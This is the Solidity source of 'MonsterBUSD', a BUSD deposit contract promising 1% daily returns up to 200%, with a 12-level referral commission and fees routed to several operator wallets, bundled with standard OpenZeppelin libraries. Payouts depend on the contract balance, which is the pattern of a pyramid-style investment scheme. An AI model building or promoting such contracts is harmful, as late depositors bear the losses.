// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./MonsterBUSD_State.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract MonsterBUSD is MonsterBUSD_State, ReentrancyGuard {
	using SafeMath for uint;
	IERC20 public token;//0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56 - busd
	event Newbie(address user);
	event NewDeposit(address indexed user, uint amount);
	event Withdrawn(address indexed user, uint amount);
	event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
	event FeePayed(address indexed user, uint totalAmount);
	event Reinvestment(address indexed user, uint amount);
	address private _defaultWallet;

	event ForceWithdraw(address indexed user, uint amount);
	constructor(address devAddr, address marketingAddr, address ceoWallet, address _partner, address _defWallet, address _token) {
		devAddress = devAddr;
		marketingAdress = marketingAddr;
		ceo_wallet = ceoWallet;
		partner_wallet = _partner;
		_defaultWallet = _defWallet;
		token = IERC20(_token);
		setPlans();
		emit Paused(msg.sender);
	}

	modifier checkUser_() {
		uint check = block.timestamp.sub(getlastActionDate(users[msg.sender]));
		require(check > TIME_STEP, "try again later");
		_;
	}

	function checkUser() external view returns (bool){
		uint check = block.timestamp.sub(getlastActionDate(users[msg.sender]));
		if(check > TIME_STEP) {
			return true;
		}
		return false;
	}

	function invest(uint investAmt, address referrer) external nonReentrant whenNotPaused {
		transferHandler(msg.sender, address(this), investAmt);
		investHandler(investAmt, referrer);
	}

	function investHandler(uint investAmt, address referrer) internal {
		uint plan = 0;
		require(investAmt >= INVEST_MIN_AMOUNT, "insufficient deposit");
		require(plan < plans.length, "invalid plan");
		payFeeInvest(investAmt);

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].depositsLength > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		address upline;

		if (user.referrer != address(0)) {
			upline = user.referrer;
		} else {
			upline = devAddress;
		}

	for(uint i; i < REFERRAL_PERCENTS.length; i++) {
		if(upline != address(0)) {
			uint amount = (investAmt.mul(REFERRAL_PERCENTS[i])).div(PERCENTS_DIVIDER);
			//users[upline].bonus += amount;
			transferHandler(address(this), upline, amount);
			users[upline].totalBonus += amount;
			if(user.depositsLength == 0)
				users[upline].referrerCount[i] += 1;
			users[upline].referrerBonus[i] += amount;
			emit RefBonus(upline, msg.sender, i, amount);
			upline = users[upline].referrer;
			if(upline == address(0)) {
				upline = _defaultWallet;
			}
		} else break;
	}


		if (user.depositsLength == 0) {
			user.checkpoint = block.timestamp;
			totalUsers++;
			emit Newbie(msg.sender);
		}

		Deposit memory newDeposit;
		newDeposit.plan = plan;
		newDeposit.amount = investAmt;
		newDeposit.start = block.timestamp;
		user.deposits[user.depositsLength] = newDeposit;
		user.depositsLength++;
		user.totalStake += investAmt;

		totalInvested += investAmt;
		totalDeposits += 1;
		emit NewDeposit(msg.sender, investAmt);
	}

	function withdraw() external whenNotPaused checkUser_ returns(bool) {
		require(isActive(msg.sender), "Dont is User");
		User storage user = users[msg.sender];

		uint totalAmount;

		for(uint i; i < user.depositsLength; i++) {
			uint dividends;
			Deposit memory deposit = user.deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				dividends = calculateDividents(deposit, user, totalAmount);

				if(dividends > 0) {
					user.deposits[i].withdrawn += dividends; /// changing of storage data
					totalAmount += dividends;
				}
			}
		}

		require(totalAmount >= MIN_WITHDRAW, "User has no dividends");

		uint referralBonus = user.bonus;
		if(referralBonus > 0) {
			totalAmount += referralBonus;
			delete user.bonus;
		}

		uint contractBalance = getContractBalance();
		if(contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		totalWithdrawn += totalAmount;
		uint256 fee = totalAmount.mul(WITHDRAW_FEE_PERCENT).div(PERCENTS_DIVIDER);
		uint256 toTransfer = totalAmount.sub(fee);
		payFees(fee);
		transferHandler(address(this), msg.sender, toTransfer);
		emit FeePayed(msg.sender, fee);
		emit Withdrawn(msg.sender, totalAmount);
		return true;

	}

	function reinvestment() external whenNotPaused checkUser_ nonReentrant returns(bool) {
		require(isActive(msg.sender), "Dont is User");
		User storage user = users[msg.sender];

		uint totalDividends;

		for(uint i; i < user.depositsLength; i++) {
			uint dividends;
			Deposit memory deposit = user.deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				dividends = calculateDividents(deposit, user, totalDividends);

				if(dividends > 0) {
					user.deposits[i].withdrawn += dividends;
					totalDividends += dividends;
				}
			}
		}

		require(totalDividends > 0, "User has no dividends");

		uint referralBonus = user.bonus;
		if(referralBonus > 0) {
			totalDividends += referralBonus;
			delete user.bonus;
		}

		user.reinvest += totalDividends;
		totalReinvested += totalDividends;
		totalWithdrawn += totalDividends;
		user.checkpoint = block.timestamp;
		investHandler(totalDividends, user.referrer);
		return true;
	}

    function forceWithdraw() external whenNotPaused nonReentrant {
        User storage user = users[msg.sender];
		uint totalDividends;
		uint toFee;
		for(uint256 i; i < user.depositsLength; i++) {
			Deposit storage deposit = user.deposits[i];
			if(deposit.force == false) {
				deposit.force = true;
				uint maxProfit = getMaxprofit(deposit);
				if(deposit.withdrawn < maxProfit) {
					uint profit = maxProfit.sub(deposit.withdrawn);
					deposit.withdrawn = deposit.withdrawn.add(profit);
					totalDividends += profit;
					toFee += deposit.amount.sub(profit, "sub error");
				}
			}

		}
		require(totalDividends > 0, "User has no dividends");
		uint256 contractBalance = getContractBalance();
		if(contractBalance < totalDividends + toFee) {
			totalDividends = contractBalance.mul(FORCE_WITHDRAW_PERCENT).div(PERCENTS_DIVIDER);
			toFee = contractBalance.sub(totalDividends, "sub error 2");
		}
		user.checkpoint = block.timestamp;
		payFees(toFee);
		transferHandler(address(this), msg.sender, totalDividends);
		emit FeePayed(msg.sender, toFee);
		emit ForceWithdraw(msg.sender, totalDividends);
    }

	function getNextUserAssignment(address userAddress) public view returns (uint) {
		uint checkpoint = getlastActionDate(users[userAddress]);
		uint _date = getContracDate();
		if(_date > checkpoint)
			checkpoint = _date;
		return checkpoint.add(TIME_STEP);
	}

	function getPublicData() external view returns(uint totalUsers_,
		uint totalInvested_,
		uint totalReinvested_,
		uint totalWithdrawn_,
		uint totalDeposits_,
		uint balance_,
		// uint roiBase,
		// uint maxProfit,
		uint minDeposit,
		uint daysFormdeploy
		) {
		totalUsers_ = totalUsers;
		totalInvested_ = totalInvested;
		totalReinvested_ = totalReinvested;
		totalWithdrawn_ = totalWithdrawn;
		totalDeposits_ = totalDeposits;
		balance_ = getContractBalance();
		// roiBase = ROI_BASE;
		// maxProfit = MAX_PROFIT;
		minDeposit = INVEST_MIN_AMOUNT;
		daysFormdeploy = (block.timestamp.sub(getContracDate())).div(TIME_STEP);
	}

	function getUserData(address userAddress) external view returns(uint totalWithdrawn_,
		uint totalDeposits_,
		uint totalBonus_,
		uint totalReinvest_,
		uint balance_,
		uint nextAssignment_,
		uint amountOfDeposits,
		uint checkpoint,
		bool isUser_,
		address referrer_,
		uint[REFERRAL_LEGNTH] memory referrerCount_,
		uint[REFERRAL_LEGNTH] memory referrerBonus_
	){
		User storage user = users[userAddress];
		totalWithdrawn_ = getUserTotalWithdrawn(userAddress);
		totalDeposits_ = getUserTotalDeposits(userAddress);
		nextAssignment_ = getNextUserAssignment(userAddress);
		balance_ = getUserDividends(userAddress);
		totalBonus_ = user.bonus;
		totalReinvest_ = user.reinvest;
		amountOfDeposits = user.depositsLength;


		checkpoint = getlastActionDate(user);
		isUser_ = user.depositsLength > 0;
		referrer_ = user.referrer;
		referrerCount_ = user.referrerCount;
		referrerBonus_= user.referrerBonus;
	}

	function getContractBalance() public view returns (uint) {
		return token.balanceOf(address(this));
	}

	function getUserDividends(address userAddress) internal view returns (uint) {
		User storage user = users[userAddress];

		uint totalDividends;

		for(uint i; i < user.depositsLength; i++) {

			Deposit memory deposit = users[userAddress].deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				uint dividends = calculateDividents(deposit, user, totalDividends);
				totalDividends += dividends;
			}

		}

		return totalDividends;
	}

	function calculateDividents(Deposit memory deposit, User storage user, uint) internal view returns (uint) {
		uint dividends;
		uint depositPercentRate = plans[deposit.plan].percent;

		uint checkDate = getDepsitStartDate(deposit);

		if(checkDate < getlastActionDate(user)) {
			checkDate = getlastActionDate(user);
		}

		dividends = (deposit.amount
		.mul(depositPercentRate.mul(block.timestamp.sub(checkDate))))
		.div((PERCENTS_DIVIDER).mul(TIME_STEP))
		;


		/*
		if(dividends + _current > userMaxProfit) {
			dividends = userMaxProfit.sub(_current, "max dividends");
		}
		*/

		if(deposit.withdrawn.add(dividends) > getMaxprofit(deposit)) {
			dividends = getMaxprofit(deposit).sub(deposit.withdrawn);
		}

		return dividends;

	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.depositsLength > 0) {
			if(users[userAddress].deposits[user.depositsLength-1].withdrawn < getMaxprofit(users[userAddress].deposits[user.depositsLength-1])) {
				return true;
			}
		}
		return false;
	}

	function getUserDepositInfo(address userAddress, uint index) external view returns(
		uint plan_,
		uint amount_,
		uint withdrawn_,
		uint timeStart_,
		uint maxProfit
		) {
		Deposit memory deposit = users[userAddress].deposits[index];
		amount_ = deposit.amount;
		plan_ = deposit.plan;
		withdrawn_ = deposit.withdrawn;
		timeStart_= getDepsitStartDate(deposit);
		maxProfit = getMaxprofit(deposit);
	}


	function getUserTotalDeposits(address userAddress) internal view returns(uint) {
		User storage user = users[userAddress];
		uint amount;
		for(uint i; i < user.depositsLength; i++) {
			amount += users[userAddress].deposits[i].amount;
		}
		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) internal view returns(uint) {
		User storage user = users[userAddress];

		uint amount;

		for(uint i; i < user.depositsLength; i++) {
			amount += users[userAddress].deposits[i].withdrawn;
		}
		return amount;
	}

	function getlastActionDate(User storage user) internal view returns(uint) {
		uint checkpoint = user.checkpoint;
		uint _date = getContracDate();
		if(_date > checkpoint)
			checkpoint = _date;
		return checkpoint;
	}

	function isContract(address addr) internal view returns (bool) {
		uint size;
		assembly { size := extcodesize(addr) }
		return size > 0;
	}

	function getDepsitStartDate(Deposit memory ndeposit) private view returns(uint) {
		uint _date = getContracDate();
		if(_date > ndeposit.start) {
			return _date;
		} else {
			return ndeposit.start;
		}
	}

	function transferHandler(address from, address to, uint amount) internal {
		if(from == address(this)) {
			if(amount > getContractBalance()) {
				amount = getContractBalance();
			}
			token.transfer(to, amount);
		}
		else {
			token.transferFrom(from, to, amount);
		}
	}

	//1000
	function payFeeInvest(uint amount) internal {
		//4%
		uint fee1 = amount.mul(40).div(PERCENTS_DIVIDER);
		transferHandler(address(this), marketingAdress, fee1);
		transferHandler(address(this), devAddress, fee1);
		//2%
		uint fee2 = amount.mul(20).div(PERCENTS_DIVIDER);
		transferHandler(address(this), ceo_wallet, fee2);
		transferHandler(address(this), partner_wallet, fee2);
		emit FeePayed(msg.sender, fee1+fee1+fee2+fee2);
	}

	function payFees(uint amount) internal {
		//40%
		uint fee1 = amount.mul(400).div(PERCENTS_DIVIDER);
		transferHandler(address(this), marketingAdress, fee1);
		transferHandler(address(this), devAddress, fee1);
		//10%
		uint fee2 = amount.mul(100).div(PERCENTS_DIVIDER);
		transferHandler(address(this), ceo_wallet, fee2);
		transferHandler(address(this), partner_wallet, fee2);
	}


}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract MonsterBUSD_State {
	using SafeMath for uint;
	// 1000 == 100%, 100 == 10%, 10 == 1%, 1 == 0.1%
	uint constant internal REFERRAL_LEGNTH = 12;
	uint[REFERRAL_LEGNTH] internal REFERRAL_PERCENTS = [100, 40, 20, 10, 5, 5, 5, 5, 3, 3, 3, 1];
	uint constant internal INVEST_MIN_AMOUNT = 5 ether;
	uint constant internal INVEST_FEE = 120;
	uint constant internal WITHDRAW_FEE_PERCENT = 100;
	uint constant internal MIN_WITHDRAW = 1 ether;
	uint constant internal PERCENTS_DIVIDER = 1000;
	uint constant internal TIME_STEP = 1 days;
	uint constant internal MARKET_FEE = 400;
	uint constant internal FORCE_WITHDRAW_PERCENT = 700;




	uint internal initDate;

	uint internal totalUsers;
	uint internal totalInvested;
	uint internal totalWithdrawn;
	uint internal totalDeposits;
	uint internal totalReinvested;

	address public marketingAdress;
	address public devAddress;
	address public ceo_wallet;
	address public partner_wallet;

	struct Deposit {
        uint plan;
		uint amount;
		uint withdrawn;
		uint start;
		bool force;
	}

	struct User {
		mapping (uint => Deposit) deposits;
		uint totalStake;
		uint depositsLength;
		uint bonus;
		uint reinvest;
		uint totalBonus;
		uint checkpoint;
		uint[REFERRAL_LEGNTH] referrerCount;
		uint[REFERRAL_LEGNTH] referrerBonus;
		address referrer;
	}
    struct Plan {
        uint time;
        uint percent;
        uint MAX_PROFIT;
    }

    Plan[1] public plans;

	mapping (address => User) public users;

	event Paused(address account);
	event Unpaused(address account);

	modifier onlyOwner() {
		require(devAddress == msg.sender, "Ownable: caller is not the owner");
		_;
	}

	modifier whenNotPaused() {
		require(initDate > 0, "Pausable: paused");
		_;
	}

	modifier whenPaused() {
		require(initDate == 0, "Pausable: not paused");
		_;
	}

	function unpause() external whenPaused onlyOwner{
		initDate = block.timestamp;
		emit Unpaused(msg.sender);
	}

	function isPaused() external view returns(bool) {
		return (initDate == 0);
	}

	function getMaxprofit(Deposit memory ndeposit) internal view returns(uint) {
		Plan memory plan = plans[ndeposit.plan];
		if(ndeposit.force) {
			return (ndeposit.amount.mul(FORCE_WITHDRAW_PERCENT)).div(PERCENTS_DIVIDER);
		}
		return (ndeposit.amount.mul(plan.MAX_PROFIT)).div(PERCENTS_DIVIDER);
	}

	function getDeposit(address _user, uint _index) public view returns(Deposit memory) {
		return users[_user].deposits[_index];
	}

	function getDAte() public view returns(uint) {
		return block.timestamp;
	}

	function getReferrerBonus(address _user) external view returns(uint[REFERRAL_LEGNTH] memory) {
		return users[_user].referrerBonus;
	}

	function getContracDate() public view returns(uint) {
		if(initDate == 0) {
			return block.timestamp;
		}
		return initDate;
	}

	function setPlans() internal {
        plans[0].time = 200;
        plans[0].percent = 10;
        plans[0].MAX_PROFIT = 2000;
    }

	function getUserPlans(address _user) external view returns(Deposit[] memory) {
		User storage user = users[_user];
		Deposit[] memory result = new Deposit[](user.depositsLength);
		for (uint i; i < user.depositsLength; i++) {
			result[i] = user.deposits[i];
		}
		return result;
	}


}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}